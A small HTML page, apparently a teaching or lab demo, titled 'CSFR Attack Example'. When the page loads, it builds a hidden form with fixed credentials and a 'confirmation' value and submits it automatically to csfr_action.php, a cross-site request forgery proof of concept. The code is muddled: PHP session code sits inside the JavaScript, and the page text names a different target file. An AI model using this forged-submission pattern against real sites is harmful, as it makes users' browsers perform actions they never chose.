<!DOCTYPE html>
<html>
<head>
    <title>CSFR Attack Example</title>
    <script>
        window.onload = function() {
            var form = document.createElement("form");
            form.action = "csfr_action.php";
            form.method = "post";
            var usernameInput = document.createElement("input");
            usernameInput.type = "hidden";
            usernameInput.name = "username";
            usernameInput.value = "host";
            var passwordInput = document.createElement("input");
            passwordInput.type = "hidden";
            passwordInput.name = "password";
            passwordInput.value = "pass";
            form.appendChild(usernameInput);
            form.appendChild(passwordInput);
            
            // Create a PHP session variable with a random value
            <?php
                session_start(); // Start the session
                $_SESSION['confirmation'] = 'hello';
            ?>
            
            // Send session variable value as a hidden form field
            var confirmationInput = document.createElement("input");
            confirmationInput.type = "hidden";
            confirmationInput.name = "confirmation";
            confirmationInput.value = "hello"; 
            form.appendChild(confirmationInput);
            
            document.body.appendChild(form);
            form.submit();
        };
    </script>
</head>
<body>
    <h1>CSFR Attack Example</h1>
    <p>Form submission will be automatically sent to csfr.php with a valid username/password combo and confirmation code.</p>
</body>
</html>
